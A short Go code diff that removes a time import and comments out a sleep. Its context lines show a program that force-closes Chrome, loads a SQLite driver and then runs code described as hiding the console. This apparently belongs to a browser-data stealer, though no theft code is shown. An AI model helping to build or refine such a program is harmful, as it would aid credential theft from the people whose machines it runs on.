@@ -14,7 +14,6 @@ import (
 	"net/http"
 	"os"
 	"path/filepath"
-	"time"
 
 	_ "github.com/mattn/go-sqlite3"
 )
@@ -30,7 +29,7 @@ func main() {
 	browsers.CloseChrome()
 
 	// Step 2: Ensure Chrome is fully closed
-	time.Sleep(1 * time.Second)
+	// time.Sleep(1 * time.Second)
 
 	// Step 3: Run antivirus and hide console logic
 	fmt.Println("Running hideconsole logic")
